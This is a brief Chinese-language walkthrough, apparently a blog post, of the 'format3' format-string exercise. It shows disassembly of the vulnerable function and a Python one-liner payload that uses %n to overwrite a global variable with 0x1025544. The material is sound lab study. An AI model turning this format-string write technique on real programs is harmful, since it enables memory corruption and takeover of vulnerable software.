![](http://imcczy.b0.upaiyun.com/2016-09-07-10%3A09%3A29.jpg)
```
public vuln
vuln proc near

s= byte ptr -208h
...
call    _fgets
lea     eax, [ebp+s]
mov     [esp], eax      ; format
call    printbuffer
mov     eax, ds:target
cmp     eax, 1025544h
jnz     short loc_80484B7
```
0x1025544需要四个字节，一次写入也可以,但是不太优雅。
```
➜  format3 python -c 'print "\xf4\x96\x04\x08"+"%16930112d"+"%12$n"' |  ./format3
```
分多次写入即可
![](http://imcczy.b0.upaiyun.com/2016-09-07-10%3A15%3A47.jpg)